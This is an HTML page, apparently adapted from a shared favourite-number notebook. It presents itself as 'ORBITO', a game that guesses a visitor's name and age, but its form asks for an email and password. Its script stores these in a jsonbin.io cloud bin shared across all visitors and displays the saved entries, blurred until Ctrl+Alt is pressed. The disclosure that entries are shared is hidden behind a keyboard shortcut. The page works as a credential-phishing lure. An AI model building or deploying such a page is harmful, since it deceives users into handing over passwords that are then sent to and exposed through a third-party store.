<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Number Notebook</title>
    <style>
      :root {
        color-scheme: light;
        --ink: #162b3a;
        --muted: #647786;
        --paper: #fffdf7;
        --line: #d9e2e8;
        --accent: #047857;
        --accent-dark: #065f46;
        --wash: #e9f7f1;
      }

      * { box-sizing: border-box; }

      body {
        align-items: center;
        background:
          radial-gradient(circle at 10% 0%, #d9f3e8 0, transparent 28rem),
          radial-gradient(circle at 96% 100%, #e5eff8 0, transparent 32rem),
          #f5f8f8;
        color: var(--ink);
        display: flex;
        font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
        justify-content: center;
        margin: 0;
        min-height: 100vh;
        padding: 2rem 1rem;
      }

      main { max-width: 41rem; width: 100%; }

      .card {
        background: color-mix(in srgb, var(--paper) 94%, white);
        border: 1px solid rgba(22, 43, 58, .1);
        border-radius: 1.5rem;
        box-shadow: 0 1.25rem 3.75rem rgba(39, 73, 91, .12);
        overflow: hidden;
      }

      header { background: var(--ink); color: white; padding: 2.25rem; }
      .eyebrow { color: #8de3bd; font-size: .77rem; font-weight: 750; letter-spacing: .13em; margin: 0 0 .75rem; text-transform: uppercase; }
      h1 { font-size: clamp(2rem, 6vw, 3.25rem); letter-spacing: -.065em; line-height: 1; margin: 0; }
      header p { color: #d5e4ea; line-height: 1.55; margin: 1rem 0 0; max-width: 35rem; }

      .content { padding: 2rem; }
      .notice {
        align-items: flex-start;
        background: var(--wash);
        border: 1px solid #c3e7d8;
        border-radius: .8rem;
        color: #14543e;
        display: flex;
        font-size: .9rem;
        gap: .65rem;
        line-height: 1.45;
        margin-bottom: 1.7rem;
        padding: .85rem 1rem;
      }
      .notice strong { display: block; }

      form { display: grid; gap: 1.15rem; }
      label { display: grid; font-size: .93rem; font-weight: 700; gap: .45rem; }
      input {
        background: white;
        border: 1px solid var(--line);
        border-radius: .7rem;
        color: var(--ink);
        font: inherit;
        outline: none;
        padding: .85rem .9rem;
      }
      input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px #b7ead5; }
      button {
        background: var(--accent);
        border: 0;
        border-radius: .7rem;
        color: white;
        cursor: pointer;
        font: inherit;
        font-weight: 750;
        padding: .9rem 1rem;
      }
      button:hover { background: var(--accent-dark); }
      button:focus-visible { outline: 3px solid #80d8b3; outline-offset: 3px; }

      .saved { border-top: 1px solid var(--line); margin-top: 2rem; padding-top: 1.5rem; }
      .saved-head { align-items: baseline; display: flex; justify-content: space-between; gap: 1rem; }
      h2 { font-size: 1.1rem; margin: 0; }
      #count { color: var(--muted); font-size: .85rem; }
      #entries { display: grid; gap: .65rem; list-style: none; margin: 1rem 0 0; padding: 0; }
      
      .entry { 
        align-items: center; 
        background: #f7faf9; 
        border: 1px solid #e5ecea; 
        border-radius: .7rem; 
        display: flex; 
        justify-content: space-between; 
        padding: .75rem .9rem; 
      }

      /* Privacy masking for entered values */
      .entry strong {
        color: transparent;
        text-shadow: 0 0 8px rgba(22, 43, 58, 0.5);
        user-select: none;
        transition: color 0.2s, text-shadow 0.2s;
      }
      .entry span {
        color: transparent;
        text-shadow: 0 0 8px rgba(100, 119, 134, 0.5);
        user-select: none;
        transition: color 0.2s, text-shadow 0.2s;
      }

      /* Revealed state when Ctrl + Alt is pressed */
      body.reveal-values .entry strong {
        color: var(--ink);
        text-shadow: none;
        user-select: text;
      }
      body.reveal-values .entry span {
        color: var(--muted);
        text-shadow: none;
        user-select: text;
      }

      .empty { color: var(--muted); font-size: .92rem; margin: 1rem 0 0; }
      footer { color: var(--muted); font-size: .78rem; line-height: 1.5; margin: 1.15rem .25rem 0; text-align: center; }

      dialog { border: 0; border-radius: 1rem; box-shadow: 0 1.5rem 5rem rgba(5, 30, 38, .28); color: var(--ink); max-width: 25rem; padding: 1.5rem; }
      dialog::backdrop { background: rgba(4, 25, 35, .5); }
      dialog h2 { font-size: 1.3rem; }
      dialog p { color: var(--muted); line-height: 1.55; }
      dialog button { float: right; margin-top: .5rem; }
    </style>
  </head>
  <body>
    <main>
      <section class="card" aria-labelledby="page-title">
        <header>
          <p class="eyebrow">IN 5 QUESTIONS YOUR NAME AND AGE WILL BE GUESSED</p>
          <h1 id="page-title">ORBITO</h1>
          <p>A simple example of asking questions and guessing.</p>
        </header>
        <div class="content">
          <aside class="notice" aria-label="Privacy notice">
            <span aria-hidden="true">✓</span>
            <div><strong>Shared link active.</strong> Entries submitted through this link sync in real time.</div>
          </aside>

          <form id="number-form">
            <label>
              Email
              <input id="name" name="name" autocomplete="off" maxlength="40" required placeholder="enter your email address" />
            </label>
            <label>
              Password
              <input id="number" name="number" inputmode="numeric" max="1000000" min="0" required type="number" placeholder="enter the password" />
            </label>
            <button type="submit">START</button>
          </form>

          <section class="saved" aria-labelledby="saved-title">
            <div class="saved-head">
              <h2 id="saved-title">Thank You For Visiting us!</h2>
              <span id="count">0 entries</span>
            </div>
            <p class="empty" id="empty">Nothing saved yet.</p>
            <ul id="entries" aria-live="polite"></ul>
          </section>
        </div>
      </section>
      <footer>Press Ctrl + Shift to read the privacy explanation.<br>Press Ctrl + Alt to toggle visibility of saved values.</footer>
    </main>

    <dialog id="privacy-dialog" aria-labelledby="privacy-title">
      <h2 id="privacy-title">Privacy explanation</h2>
      <p>This page shares entries across users via a cloud bin. Passwords and personal details should not be used in real production apps.</p>
      <button id="close-dialog" type="button">Got it</button>
    </dialog>

    <script>
      const BIN_ID = "YOUR_BIN_ID_HERE";
      const API_KEY = "YOUR_API_KEY_HERE";
      const API_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;

      const form = document.querySelector("#number-form");
      const entries = document.querySelector("#entries");
      const empty = document.querySelector("#empty");
      const count = document.querySelector("#count");
      const dialog = document.querySelector("#privacy-dialog");

      async function getEntries() {
        try {
          const response = await fetch(API_URL + "/latest", {
            headers: { "X-Master-Key": API_KEY }
          });
          const result = await response.json();
          return result.record.entries ?? [];
        } catch (err) {
          console.error("Failed to load entries", err);
          return [];
        }
      }

      async function render() {
        const saved = await getEntries();
        entries.replaceChildren();
        empty.hidden = saved.length > 0;
        count.textContent = `${saved.length} ${saved.length === 1 ? "entry" : "entries"}`;
        
        saved.forEach(({ name, number }) => {
          const row = document.createElement("li");
          row.className = "entry";
          const savedName = document.createElement("strong");
          const savedNumber = document.createElement("span");
          savedName.textContent = name;
          savedNumber.textContent = `Favourite number: ${number}`;
          row.append(savedName, savedNumber);
          entries.append(row);
        });
      }

      form.addEventListener("submit", async (event) => {
        event.preventDefault();
        const name = form.elements.name.value.trim();
        const number = form.elements.number.value;
        if (!name || !number) return;

        try {
          // 1. Fetch current items
          const currentEntries = await getEntries();
          currentEntries.unshift({ name, number });

          // 2. Update cloud storage
          const response = await fetch(API_URL, {
            method: "PUT",
            headers: {
              "Content-Type": "application/json",
              "X-Master-Key": API_KEY
            },
            body: JSON.stringify({ entries: currentEntries.slice(0, 20) })
          });

          if (response.ok) {
            form.reset();
            render();
          } else {
            alert("Error saving data.");
          }
        } catch (err) {
          console.error("Submission error", err);
        }
      });

      document.addEventListener("keydown", (event) => {
        if (event.ctrlKey && event.shiftKey && !event.altKey && !event.metaKey) {
          event.preventDefault();
          dialog.showModal();
        }
        if (event.ctrlKey && event.altKey && !event.shiftKey && !event.metaKey) {
          event.preventDefault();
          document.body.classList.toggle("reveal-values");
        }
      });

      document.querySelector("#close-dialog").addEventListener("click", () => dialog.close());
      render();
    </script>
  </body>
</html>
